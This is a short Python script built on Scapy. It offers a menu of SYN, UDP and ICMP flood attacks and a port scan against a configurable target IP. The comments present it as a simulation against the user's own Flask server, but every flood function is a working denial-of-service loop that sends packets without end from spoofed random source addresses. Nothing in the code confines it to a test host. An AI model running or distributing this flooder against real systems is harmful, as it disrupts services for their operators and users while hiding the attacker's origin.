from scapy.all import *
import random
import time

# Target IP (Set to the machine running your Flask application)
TARGET_IP = "192.168.1.100"   # Change this to your server's IP
TARGET_PORT = 5000            # Your Flask server port (or any open port for testing)

def syn_flood(target_ip, target_port):
    """ Simulates a SYN Flood Attack """
    print("[*] Launching SYN Flood Attack...")
    while True:
        ip_layer = IP(src=RandIP(), dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

def udp_flood(target_ip, target_port):
    """ Simulates a UDP Flood Attack """
    print("[*] Launching UDP Flood Attack...")
    while True:
        packet = IP(src=RandIP(), dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / Raw(load="X" * 1024)
        send(packet, verbose=False)

def icmp_flood(target_ip):
    """ Simulates an ICMP Flood Attack """
    print("[*] Launching ICMP Flood Attack...")
    while True:
        packet = IP(src=RandIP(), dst=target_ip) / ICMP()
        send(packet, verbose=False)

def port_scan(target_ip, ports=[21, 22, 23, 25, 53, 80, 443, 8080]):
    """ Simulates a Port Scan Attack """
    print("[*] Performing Port Scan...")
    for port in ports:
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=port, flags="S")  # SYN flag for scanning
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
        time.sleep(0.5)

if __name__ == "__main__":
    print("""
    [1] SYN Flood
    [2] UDP Flood
    [3] ICMP Flood
    [4] Port Scan
    """)
    
    choice = input("Select an attack type: ")
    
    if choice == "1":
        syn_flood(TARGET_IP, TARGET_PORT)
    elif choice == "2":
        udp_flood(TARGET_IP, TARGET_PORT)
    elif choice == "3":
        icmp_flood(TARGET_IP)
    elif choice == "4":
        port_scan(TARGET_IP)
    else:
        print("Invalid choice!")
